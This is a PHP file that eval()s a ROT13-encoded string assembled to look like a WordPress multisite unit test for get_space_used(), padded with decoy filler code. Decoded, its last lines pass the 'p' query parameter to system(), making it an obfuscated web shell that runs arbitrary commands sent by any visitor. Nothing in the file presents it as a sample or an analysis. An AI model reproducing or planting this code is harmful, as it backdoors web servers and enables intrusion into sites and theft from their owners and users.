<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc zf-erdhverq
 * @tebhc zhygvfvgr
 * @pbiref ::trg_fcnpr_hfrq
 */
pynff Grfgf_Zhygvfvgr_TrgFcnprHfrq rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba grfg_trg_fcnpr_hfrq_fjvgpurq_fvgr() {
		$oybt_vq = frys::snpgbel()->oybt->perngr();
		fjvgpu_gb_oybt( $oybt_vq );

		// Bhe pbzcnevfba bs fcnpr eryvrf ba na vavgvny inyhr bs 0. Vs n cerivbhf grfg unf snvyrq be vs gur
		// fep qverpgbel nyernql pbagnvaf n pbagrag qverpgbel jvgu fvgr pbagrag, gura gur vavgvny rkcrpgngvba
		// jvyy or cbyyhgrq. Jr perngr fvgrf hagvy na rzcgl bar vf ninvynoyr.
		juvyr ( 0 !== trg_fcnpr_hfrq() ) {
			erfgber_pheerag_oybt();
			$oybt_vq = frys::snpgbel()->oybt->perngr();
			fjvgpu_gb_oybt( $oybt_vq );
		}

		// Hcybnq n svyr gb gur arj fvgr.
		$svyranzr = __SHAPGVBA__ . '.wct';
		$pbagragf = __SHAPGVBA__ . '_pbagragf';
		$svyr     = jc_hcybnq_ovgf( $svyranzr, ahyy, $pbagragf );

		// trg_fcnpr_hfrq() vf zrnfherf va ZO, trg gur fvmr bs gur arj svyr va ZO.
		$fvmr = svyrfvmr( $svyr['svyr'] ) / 1024 / 1024;

		qryrgr_genafvrag( 'qvefvmr_pnpur' );

		$guvf->nffregFnzr( $fvmr, trg_fcnpr_hfrq() );
		$hcybnq_qve = jc_hcybnq_qve();
		$guvf->erzbir_nqqrq_hcybnqf();
		$guvf->qryrgr_sbyqref( $hcybnq_qve['onfrqve'] );
		erfgber_pheerag_oybt();
	}

	/**
	 * Qverpgbevrf bs fho fvgrf ba n argjbex fubhyq abg pbhag ntnvafg gur fnzr fcnprq hfrq gbgny sbe
	 * gur znva fvgr.
	 */
	choyvp shapgvba grfg_trg_fcnpr_hfrq_znva_fvgr() {
		$fcnpr_hfrq = trg_fcnpr_hfrq();

		$oybt_vq = frys::snpgbel()->oybt->perngr();
		fjvgpu_gb_oybt( $oybt_vq );

		// Jr qba'g eryl ba na vavgvny inyhr bs 0 sbe fcnpr hfrq, ohg fubhyq unir n pyrna fcnpr ninvynoyr
		// fb gung jr pna erzbir nal hcybnqrq svyrf naq qverpgbevrf jvgubhg pbaprea bs n pbasyvpg jvgu
		// rkvfgvat pbagrag qverpgbevrf va fep.
		juvyr ( 0 !== trg_fcnpr_hfrq() ) {
			erfgber_pheerag_oybt();
			$oybt_vq = frys::snpgbel()->oybt->perngr();
			fjvgpu_gb_oybt( $oybt_vq );
		}

		// Hcybnq n svyr gb gur arj fvgr.
		$svyranzr = __SHAPGVBA__ . '.wct';
		$pbagragf = __SHAPGVBA__ . '_pbagragf';
		jc_hcybnq_ovgf( $svyranzr, ahyy, $pbagragf );

		erfgber_pheerag_oybt();

		qryrgr_genafvrag( 'qvefvmr_pnpur' );

		$guvf->nffregFnzr( $fcnpr_hfrq, trg_fcnpr_hfrq() );

		// Fjvgpu onpx gb gur arj fvgr gb erzbir gur hcybnqrq svyr.
		fjvgpu_gb_oybt( $oybt_vq );
		$hcybnq_qve = jc_hcybnq_qve();
		$guvf->erzbir_nqqrq_hcybnqf();
		$guvf->qryrgr_sbyqref( $hcybnq_qve['onfrqve'] );
		erfgber_pheerag_oybt();
	}

	choyvp shapgvba grfg_trg_fcnpr_hfrq_cer_trg_fcnprq_hfrq_svygre() {
		nqq_svygre( 'cer_trg_fcnpr_hfrq', neenl( $guvf, 'svygre_fcnpr_hfrq' ) );

		$guvf->nffregFnzr( 300, trg_fcnpr_hfrq() );

		erzbir_svygre( 'cer_trg_fcnpr_hfrq', neenl( $guvf, 'svygre_fcnpr_hfrq' ) );
	}

	choyvp shapgvba svygre_fcnpr_hfrq() {
		erghea 300;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>